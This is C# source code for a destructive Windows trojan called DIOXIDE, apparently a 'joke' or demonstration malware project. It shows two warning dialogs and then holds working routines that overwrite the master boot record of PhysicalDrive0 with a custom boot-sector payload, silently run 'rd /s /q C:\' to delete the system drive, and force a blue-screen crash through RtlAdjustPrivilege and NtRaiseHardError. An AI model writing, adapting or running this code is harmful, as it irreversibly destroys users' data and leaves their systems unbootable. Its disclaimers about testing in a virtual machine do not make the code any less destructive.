﻿using System;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Security;
using System.Windows.Forms;

namespace DIOXIDE
{
    class destruction
    {
		[DllImport("kernel32.dll", SetLastError = true)]
		[ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
		[SuppressUnmanagedCodeSecurity]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool CloseHandle(IntPtr hObject);

		[DllImport("kernel32.dll", CharSet = CharSet.Auto,
	CallingConvention = CallingConvention.StdCall,
	SetLastError = true)]
		public static extern IntPtr CreateFileW(
	string lpFileName,
	uint dwDesiredAccess,
	uint dwShareMode,
	IntPtr lpSecurityAttributes,
	uint dwCreationDisposition,
	uint dwFlagsAndAttributes,
	IntPtr hTemplateFile
	);
		[DllImport("kernel32.dll")]
		static extern void ExitProcess(uint uExitCode);

		[DllImport("kernel32.dll")]
		static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer,
		   uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten,
		   [In] IntPtr lpOverlapped);

		[DllImport("ntdll.dll")]
		private static extern uint RtlAdjustPrivilege(
   int Privilege,
   bool bEnablePrivilege,
   bool IsThreadPrivilege,
   out bool PreviousValue
);

		[DllImport("ntdll.dll")]
		private static extern uint NtRaiseHardError(
			uint ErrorStatus,
			uint NumberOfParameters,
			uint UnicodeStringParameterMask,
			IntPtr Parameters,
			uint ValidResponseOption,
			out uint Response
		);

		static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
		public const uint GENERIC_READ = 0x80000000;
		public const uint GENERIC_WRITE = 0x40000000;
		public const uint CREATE_NEW = 1;
		public const uint CREATE_ALWAYS = 2;
		public const uint OPEN_EXISTING = 3;
		public const uint FILE_SHARE_READ = 1;
		public const uint FILE_SHARE_WRITE = 2;

		private static byte[] code1 = {
	0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E, 0xE8, 0x8E, 0xD0, 0x66, 0xBC, 0x00, 0x7C,
	0x00, 0x00, 0x66, 0x89, 0xE5, 0xEA, 0x1A, 0x7C, 0x00, 0x00, 0x30, 0xE4, 0xB0, 0x13, 0xCD, 0x10,
	0x0F, 0x31, 0xA3, 0xA9, 0x7C, 0xE8, 0x24, 0x00, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBF, 0xFF, 0xF9,
	0xB1, 0x20, 0xEB, 0x44, 0x89, 0xD8, 0xC1, 0xE0, 0x07, 0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE8, 0x09,
	0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE0, 0x08, 0x31, 0xC3, 0x89, 0xD8, 0xC3, 0xB4, 0x02, 0x30, 0xFF,
	0x30, 0xD2, 0xCD, 0x10, 0xBE, 0xAB, 0x7C, 0xAC, 0x08, 0xC0, 0x74, 0x15, 0x50, 0x8B, 0x1E, 0xA9,
	0x7C, 0xE8, 0xD0, 0xFF, 0x31, 0x06, 0xA9, 0x7C, 0x88, 0xC3, 0x58, 0xB4, 0x0E, 0xCD, 0x10, 0xEB,
	0xE6, 0xFE, 0xC6, 0x74, 0x02, 0xEB, 0xD5, 0xC3, 0x8B, 0x1E, 0xA9, 0x7C, 0xE8, 0xB5, 0xFF, 0x31,
	0x06, 0xA9, 0x7C, 0x31, 0xD2, 0xBB, 0x03, 0x00, 0xF7, 0xF3, 0x89, 0xD0, 0x00, 0xC8, 0x26, 0x88,
	0x05, 0x4F, 0x83, 0xFF, 0xFF, 0x75, 0xE1, 0xBF, 0xFF, 0xF9, 0x80, 0xF9, 0x33, 0x7F, 0x04, 0xFE,
	0xC1, 0xEB, 0xD5, 0xFE, 0xC5, 0xB1, 0x20, 0xEB, 0xCF, 0x00, 0x10, 0x54, 0x68, 0x69, 0x73, 0x20,
	0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20,
	0x64, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x4D, 0x6F, 0x6E, 0x6F, 0x78,
	0x69, 0x64, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
		private static uint STATUS_ASSERTION_FAILURE = 0xC0000350;
		public void WARNING()
        {
            if (MessageBox.Show("WARNING!\n\nYou have ran a Trojan known as Dioxide.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", "Malware alert - DIOXIDE", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
            {
                Environment.Exit(0);
            }
            else
            {
                if (MessageBox.Show("FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", "Malware alert - DIOXIDE", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.No)
                {
                    Environment.Exit(0);
                }
            }
        }
        public void OverwriteBoot()
        {
			IntPtr hDrive;
			uint dwWrittenBytes;
			bool bSuccess;

			hDrive = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);

			if (hDrive == INVALID_HANDLE_VALUE)
			{

			}

			bSuccess = WriteFile(hDrive, code1, 512, out dwWrittenBytes, IntPtr.Zero);

			if (!bSuccess)
			{
				CloseHandle(hDrive);
			}
		}
		public void destructionCMD()
        {
			System.Diagnostics.ProcessStartInfo p = new System.Diagnostics.ProcessStartInfo();
			p.FileName = "cmd.exe";
			p.Arguments = "cmd /c /rd /s /q C:\\";
			p.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			p.CreateNoWindow = true;
			System.Diagnostics.Process.Start(p);
        }
		public void Exit()
        {
			RtlAdjustPrivilege(19, true, false, out bool previousValue);
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, IntPtr.Zero, 6, out uint Response);
		}
    }
    }